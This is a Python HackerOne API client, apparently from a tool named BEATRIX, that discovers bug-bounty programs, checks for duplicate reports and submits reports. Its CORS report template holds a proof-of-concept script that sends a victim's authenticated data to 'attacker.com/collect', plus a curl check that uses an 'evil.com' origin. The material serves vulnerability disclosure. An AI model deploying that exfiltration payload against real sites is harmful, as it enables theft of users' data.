#!/usr/bin/env python3
"""
BEATRIX HackerOne Integration

Full HackerOne API v1 client:
- Report submission (not just drafts)
- Duplicate checking via report search
- Program discovery & scope enumeration
- Credential loading from config
- Proper Basic auth (username:apikey)

Reference: https://api.hackerone.com/

Auth: Basic auth using username:api_token (NOT Bearer token)
The username is the HackerOne handle, api_token from API settings.
"""

import csv
import os
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import requests


@dataclass
class H1ReportDraft:
    """HackerOne report draft structure"""
    title: str
    vulnerability_type: str  # VRT ID
    severity: str  # none, low, medium, high, critical
    summary: str
    impact: str
    steps_to_reproduce: str
    weakness_id: Optional[str] = None  # CWE ID
    proof_of_concept: Optional[str] = None
    recommendations: Optional[str] = None


class HackerOneClient:
    """
    HackerOne API Client

    Authentication: Basic auth (username:api_token)
    NOT Bearer token — that was the old (wrong) implementation.

    Credentials are loaded from config/hackerone_credentials.csv
    or passed directly via constructor.
    """

    BASE_URL = "https://api.hackerone.com/v1"

    # VRT mappings for common vulnerabilities
    VRT_MAPPINGS = {
        "cors": "server_security_misconfiguration.unsafe_cross_origin_resource_sharing",
        "xss": "cross_site_scripting_xss.reflected_xss",
        "sqli": "sql_injection",
        "ssrf": "server_side_request_forgery_ssrf",
        "idor": "insecure_direct_object_reference_idor",
        "open_redirect": "open_redirect",
        "csrf": "cross_site_request_forgery_csrf",
        "info_disclosure": "information_disclosure",
        "leaked_credentials": "information_disclosure.credentials_disclosure",
        "hardcoded_secrets": "information_disclosure.credentials_disclosure",
        "sensitive_data": "information_disclosure.sensitive_data_disclosure",
    }

    # CWE mappings
    CWE_MAPPINGS = {
        "cors": "942",
        "xss": "79",
        "sqli": "89",
        "ssrf": "918",
        "idor": "639",
        "open_redirect": "601",
        "csrf": "352",
        "leaked_credentials": "798",  # Use of Hard-coded Credentials
        "hardcoded_secrets": "798",
        "sensitive_data": "200",
        "info_disclosure": "200",
    }

    # Severity rating to CVSS score mapping for H1 API
    SEVERITY_CVSS = {
        "critical": 9.0,
        "high": 7.5,
        "medium": 5.5,
        "low": 3.0,
        "none": 0.0,
    }

    def __init__(
        self,
        username: Optional[str] = None,
        api_token: Optional[str] = None,
        config_dir: Optional[str] = None,
    ):
        """
        Initialize HackerOne client.

        Priority for credentials:
        1. Explicit username/api_token args
        2. Config file at config_dir/hackerone_credentials.csv
        3. Environment variables H1_USERNAME, H1_API_TOKEN

        Args:
            username: HackerOne handle (e.g., "sudopacman-syuu")
            api_token: API token from HackerOne settings
            config_dir: Path to config directory containing credentials.csv
        """
        self.username, self.api_token = self._resolve_credentials(
            username, api_token, config_dir
        )

        self.session = requests.Session()
        # CORRECT AUTH: Basic auth, NOT Bearer
        self.session.auth = (self.username, self.api_token)
        self.session.headers.update({
            "Content-Type": "application/json",
            "Accept": "application/json",
        })

    def _resolve_credentials(
        self,
        username: Optional[str],
        api_token: Optional[str],
        config_dir: Optional[str],
    ) -> Tuple[str, str]:
        """Resolve HackerOne credentials from args, env vars, or config file"""

        # Priority 1: Direct args
        if username and api_token:
            return username, api_token

        # Priority 2: Environment variables (preferred — no plaintext on disk)
        env_user = os.environ.get("H1_USERNAME", "")
        env_token = os.environ.get("H1_API_TOKEN", "")
        if env_user and env_token:
            return env_user, env_token

        # Priority 3: Config file (fallback)
        if config_dir:
            cred_file = Path(config_dir) / "hackerone_credentials.csv"
        else:
            # Try standard locations
            cred_file = Path(__file__).parent.parent / "config" / "hackerone_credentials.csv"

        if cred_file.exists():
            try:
                with open(cred_file) as f:
                    reader = csv.reader(f)
                    for row in reader:
                        if len(row) >= 3 and row[0].strip().lower() == "hackerone":
                            import sys
                            print(
                                "⚠️  Loading HackerOne credentials from plaintext CSV. "
                                "Consider using H1_USERNAME / H1_API_TOKEN env vars instead.",
                                file=sys.stderr,
                            )
                            return row[1].strip(), row[2].strip()
            except Exception as e:
                print(f"Warning: Failed to read credentials file: {e}")

        raise ValueError(
            "HackerOne credentials not found. Provide username/api_token, "
            "set H1_USERNAME/H1_API_TOKEN env vars, or create "
            "config/hackerone_credentials.csv"
        )

    # =========================================================================
    # AUTHENTICATION & PROFILE
    # =========================================================================

    def verify_auth(self) -> bool:
        """Verify that authentication is working"""
        try:
            resp = self.session.get(f"{self.BASE_URL}/hackers/programs", params={"page[size]": 1})
            return resp.status_code == 200
        except Exception:
            return False

    def get_profile(self) -> Optional[Dict]:
        """Get current user profile (may not work on all accounts)"""
        try:
            resp = self.session.get(f"{self.BASE_URL}/hackers/me")
            if resp.status_code == 200:
                return resp.json()
            return None
        except Exception:
            return None

    # =========================================================================
    # PROGRAM DISCOVERY
    # =========================================================================

    def get_programs(self, max_pages: int = 5) -> List[Dict]:
        """Get list of available bug bounty programs"""
        programs = []
        page = 1

        while page <= max_pages:
            try:
                resp = self.session.get(
                    f"{self.BASE_URL}/hackers/programs",
                    params={"page[size]": 100, "page[number]": page},
                )
                resp.raise_for_status()
                data = resp.json().get("data", [])
                if not data:
                    break
                programs.extend(data)
                page += 1
            except Exception as e:
                print(f"Error fetching programs: {e}")
                break

        return programs

    def search_program(self, name: str) -> Optional[Dict]:
        """Search for a program by name or handle"""
        programs = self.get_programs()
        name_lower = name.lower()

        for program in programs:
            handle = program.get("attributes", {}).get("handle", "")
            prog_name = program.get("attributes", {}).get("name", "")

            # Exact handle match first
            if name_lower == handle.lower():
                return program

        # Then partial match
        for program in programs:
            handle = program.get("attributes", {}).get("handle", "")
            prog_name = program.get("attributes", {}).get("name", "")

            if name_lower in handle.lower() or name_lower in prog_name.lower():
                return program

        return None

    def get_program_scope(self, program_handle: str) -> List[Dict]:
        """Get program scope/assets"""
        try:
            resp = self.session.get(
                f"{self.BASE_URL}/hackers/programs/{program_handle}/structured_scopes"
            )
            resp.raise_for_status()
            return resp.json().get("data", [])
        except Exception as e:
            print(f"Error fetching scope: {e}")
            return []

    # =========================================================================
    # DUPLICATE CHECKING
    # =========================================================================

    def check_duplicates(
        self,
        program_handle: str,
        keywords: List[str],
        vuln_type: Optional[str] = None,
    ) -> List[Dict]:
        """
        Check for potential duplicate reports on a program.

        Searches hacktivity and existing reports for similar findings.

        Args:
            program_handle: The H1 program handle (e.g., "bykea")
            keywords: Search terms to look for (e.g., ["github", "leaked", "credentials"])
            vuln_type: Optional VRT type to filter by

        Returns:
            List of potential duplicate reports
        """
        duplicates = []

        # Method 1: Search hacktivity (public disclosures)
        hacktivity_dupes = self._search_hacktivity(program_handle, keywords)
        duplicates.extend(hacktivity_dupes)

        # Method 2: Search our own reports
        own_dupes = self._search_own_reports(program_handle, keywords)
        duplicates.extend(own_dupes)

        return duplicates

    def _search_hacktivity(
        self,
        program_handle: str,
        keywords: List[str],
    ) -> List[Dict]:
        """Search hacktivity for similar public reports"""
        try:
            resp = self.session.get(
                f"{self.BASE_URL}/hackers/hacktivity",
                params={
                    "filter[program][]": program_handle,
                    "page[size]": 100,
                },
            )

            if resp.status_code != 200:
                return []

            reports = resp.json().get("data", [])
            matches = []

            for report in reports:
                attrs = report.get("attributes", {})
                title = attrs.get("title", "").lower()

                # Check if any keywords match the title
                for keyword in keywords:
                    if keyword.lower() in title:
                        matches.append({
                            "source": "hacktivity",
                            "id": report.get("id"),
                            "title": attrs.get("title"),
                            "severity": attrs.get("severity_rating"),
                            "state": attrs.get("state"),
                            "disclosed_at": attrs.get("disclosed_at"),
                            "match_keyword": keyword,
                        })
                        break

            return matches

        except Exception as e:
            print(f"Error searching hacktivity: {e}")
            return []

    def _search_own_reports(
        self,
        program_handle: str,
        keywords: List[str],
    ) -> List[Dict]:
        """Search our own submitted reports for duplicates"""
        try:
            resp = self.session.get(
                f"{self.BASE_URL}/hackers/me/reports",
                params={
                    "filter[program][]": program_handle,
                    "page[size]": 100,
                },
            )

            if resp.status_code != 200:
                # This endpoint may not be available on all accounts
                return []

            reports = resp.json().get("data", [])
            matches = []

            for report in reports:
                attrs = report.get("attributes", {})
                title = attrs.get("title", "").lower()
                info = attrs.get("vulnerability_information", "").lower()

                for keyword in keywords:
                    kw = keyword.lower()
                    if kw in title or kw in info:
                        matches.append({
                            "source": "own_reports",
                            "id": report.get("id"),
                            "title": attrs.get("title"),
                            "severity": attrs.get("severity_rating"),
                            "state": attrs.get("state"),
                            "created_at": attrs.get("created_at"),
                            "match_keyword": keyword,
                        })
                        break

            return matches

        except Exception as e:
            print(f"Error searching own reports: {e}")
            return []

    # =========================================================================
    # REPORT SUBMISSION
    # =========================================================================

    def submit_report(
        self,
        program_handle: str,
        title: str,
        vulnerability_information: str,
        impact: str,
        severity_rating: str = "high",
        weakness_id: Optional[int] = None,
        structured_scope_id: Optional[str] = None,
    ) -> Optional[Dict]:
        """
        Submit a FULL report (not a draft) to HackerOne.

        This is the method that actually submits. No drafts, no half-measures.

        Args:
            program_handle: Target program handle (e.g., "bykea")
            title: Report title
            vulnerability_information: Full report body (markdown)
            impact: Impact statement
            severity_rating: "none", "low", "medium", "high", "critical"
            weakness_id: CWE ID number (optional)
            structured_scope_id: Specific asset ID (optional)

        Returns:
            Report data dict if successful, None otherwise
        """
        payload = {
            "data": {
                "type": "report",
                "attributes": {
                    "team_handle": program_handle,
                    "title": title,
                    "vulnerability_information": vulnerability_information,
                    "impact": impact,
                    "severity_rating": severity_rating,
                }
            }
        }

        # Add weakness (CWE) if provided
        if weakness_id:
            payload["data"]["relationships"] = {
                "weakness": {
                    "data": {
                        "type": "weakness",
                        "id": weakness_id,
                    }
                }
            }

        # Add structured scope if provided
        if structured_scope_id:
            if "relationships" not in payload["data"]:
                payload["data"]["relationships"] = {}
            payload["data"]["relationships"]["structured_scope"] = {
                "data": {
                    "type": "structured-scope",
                    "id": structured_scope_id,
                }
            }

        try:
            resp = self.session.post(
                f"{self.BASE_URL}/hackers/reports",
                json=payload,
            )

            if resp.status_code in [200, 201]:
                data = resp.json()
                report_id = data.get("data", {}).get("id", "unknown")
                print(f"✅ Report #{report_id} submitted successfully!")
                return data
            else:
                print(f"❌ Submission failed: {resp.status_code}")
                print(f"   Response: {resp.text[:500]}")
                return None

        except Exception as e:
            print(f"❌ Exception during submission: {e}")
            return None

    def submit_from_draft(self, program_handle: str, draft: H1ReportDraft) -> Optional[Dict]:
        """Submit a report from an H1ReportDraft object"""

        # Build full report content
        full_content = f"""## Summary
{draft.summary}

## Steps to Reproduce
{draft.steps_to_reproduce}
"""

        if draft.proof_of_concept:
            full_content += f"""
## Proof of Concept
{draft.proof_of_concept}
"""

        if draft.recommendations:
            full_content += f"""
## Recommendations
{draft.recommendations}
"""

        weakness_id = int(draft.weakness_id) if draft.weakness_id else None

        return self.submit_report(
            program_handle=program_handle,
            title=draft.title,
            vulnerability_information=full_content,
            impact=draft.impact,
            severity_rating=draft.severity,
            weakness_id=weakness_id,
        )

    def create_draft_report(
        self,
        program_handle: str,
        draft: H1ReportDraft,
    ) -> Optional[Dict]:
        """
        Create a draft report on HackerOne

        Note: This is the legacy method. For full submission, use submit_report()
        or submit_from_draft().

        Returns the created report data if successful
        """
        # For the H1 API, drafts and submissions use the same endpoint
        # The difference is in the UI workflow — API submissions go straight to "new"
        return self.submit_from_draft(program_handle, draft)

    def build_cors_draft(
        self,
        target_name: str,
        affected_endpoint: str,
        origin_reflected: bool,
        credentials_allowed: bool,
        additional_notes: str = "",
    ) -> H1ReportDraft:
        """Build a CORS vulnerability draft report"""

        severity = "medium"
        if credentials_allowed:
            severity = "high"

        title = f"CORS Misconfiguration on {affected_endpoint}"

        summary = f"""A Cross-Origin Resource Sharing (CORS) misconfiguration was identified on {target_name}.

**Affected Endpoint:** `{affected_endpoint}`

**Misconfiguration Details:**
- Arbitrary Origin Reflection: {'Yes' if origin_reflected else 'No'}
- Access-Control-Allow-Credentials: {'true' if credentials_allowed else 'false'}

This configuration allows any malicious website to make authenticated cross-origin requests to this endpoint, potentially exposing sensitive user data.
"""

        steps = f"""1. Ensure you are logged into {target_name}
2. Open the attacker's webpage (PoC HTML below)
3. The malicious JavaScript makes a cross-origin request to `{affected_endpoint}`
4. Due to the CORS misconfiguration, the browser allows reading the response
5. Sensitive data is exfiltrated to the attacker's server

**cURL Verification:**
```bash
curl -s -I -H "Origin: https://evil.com" "{affected_endpoint}" | grep -i "access-control"
```

**Expected Output:**
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
"""

        impact = f"""An attacker can exploit this vulnerability to:

1. **Data Theft:** Steal sensitive user information from authenticated API responses
2. **Session Hijacking:** If session tokens are exposed, full account takeover is possible
3. **Privacy Violation:** User data can be collected without consent

**Attack Scenario:**
1. Attacker creates a phishing page that looks legitimate
2. Victim visits the page while logged into {target_name}
3. Hidden JavaScript makes API requests using victim's session
4. Response data is sent to attacker's server
5. Attacker now has access to victim's data
"""

        poc = f"""```html
<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
<script>
fetch('{affected_endpoint}', {{
    credentials: 'include'
}})
.then(r => r.json())
.then(data => {{
    console.log('Stolen data:', data);
    // Exfiltrate to attacker
    fetch('https://attacker.com/collect', {{
        method: 'POST',
        body: JSON.stringify(data)
    }});
}});
</script>
</body>
</html>
```

{additional_notes}
"""

        recommendations = """1. Implement a strict allowlist of trusted origins
2. Do not reflect arbitrary Origin headers in ACAO
3. If credentials are needed, ensure origin validation is strict
4. Consider using SameSite=Strict on session cookies as defense-in-depth
5. Remove Access-Control-Allow-Credentials unless absolutely required
"""

        return H1ReportDraft(
            title=title,
            vulnerability_type=self.VRT_MAPPINGS["cors"],
            severity=severity,
            summary=summary,
            impact=impact,
            steps_to_reproduce=steps,
            weakness_id=self.CWE_MAPPINGS["cors"],
            proof_of_concept=poc,
            recommendations=recommendations,
        )


def main():
    """Example usage"""
    import sys

    client = HackerOneClient()  # Loads credentials from config

    # Verify auth
    if not client.verify_auth():
        print("❌ Authentication failed!")
        sys.exit(1)

    print(f"✅ Authenticated as: {client.username}")

    # Check for command
    if len(sys.argv) >= 3 and sys.argv[1] == "dupecheck":
        program = sys.argv[2]
        keywords = sys.argv[3:] if len(sys.argv) > 3 else []

        if not keywords:
            print("Usage: python hackerone.py dupecheck <program> <keyword1> <keyword2> ...")
            sys.exit(1)

        print(f"\nChecking for duplicates on '{program}' with keywords: {keywords}")
        dupes = client.check_duplicates(program, keywords)

        if dupes:
            print(f"\n⚠️  Found {len(dupes)} potential duplicates:")
            for d in dupes:
                print(f"  [{d['source']}] #{d['id']} — {d['title']}")
                print(f"    State: {d.get('state', 'unknown')}, Severity: {d.get('severity', 'unknown')}")
        else:
            print("\n✅ No duplicates found!")
    else:
        # List available programs
        print("\nFetching available programs...")
        programs = client.get_programs()

        print(f"\nFound {len(programs)} programs:")
        for p in programs[:10]:
            attrs = p.get("attributes", {})
            print(f"  - {attrs.get('name')} ({attrs.get('handle')})")

        if len(programs) > 10:
            print(f"  ... and {len(programs) - 10} more")


if __name__ == "__main__":
    main()
